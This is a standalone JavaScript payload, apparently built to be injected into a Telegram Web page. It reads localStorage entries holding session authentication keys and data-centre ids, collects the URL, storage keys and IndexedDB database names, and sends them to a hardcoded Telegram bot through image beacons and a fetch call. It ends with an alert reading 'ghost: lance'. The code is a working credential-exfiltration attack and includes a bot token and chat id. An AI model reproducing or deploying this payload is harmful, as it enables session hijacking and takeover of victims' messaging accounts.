(function () {
  var BOT  = '8710535929:AAE8JvCbRXQ4wkrsVeKwl3yKhBmhsbxfxPA';
  var CHAT = '8425878739';
  var BASE = 'https://api.telegram.org/bot' + BOT + '/sendMessage?chat_id=' + CHAT + '&text=';
  function beacon(t) { var i = new Image(); i.src = BASE + encodeURIComponent(t); }

  var L = localStorage, keys = [], vals = [], i, k, v;
  for (i = 0; i < L.length; i++) {
    k = L.key(i); keys.push(k);
    if (/auth_key|^dc$|^dc\d|user_auth|version|client/i.test(k)) {
      v = L.getItem(k) || '';
      vals.push(k + '=' + (v.length > 30 ? v.slice(0, 30) + '..len' + v.length : v));
    }
  }
  beacon('PROBE1 url=' + location.href + '\nls_n=' + L.length +
         '\nval:\n' + vals.join('\n') + '\nkeys:\n' + keys.slice(0, 60).join(','));

  if (indexedDB.databases) {
    indexedDB.databases().then(function (ds) {
      beacon('PROBE1b idb=' + ds.map(function (d) { return d.name + '@' + d.version; }).join(','));
    });
  }

  fetch(BASE + 'PROBE2_fetch_ok')
    .then(function (r) { return r.text(); })
    .then(function (t) { beacon('PROBE2 fetch_ok ' + t.slice(0, 60)); })
    .catch(function (e) { beacon('PROBE2 fetch_err ' + e); });

  alert('ghost: lance');
})();
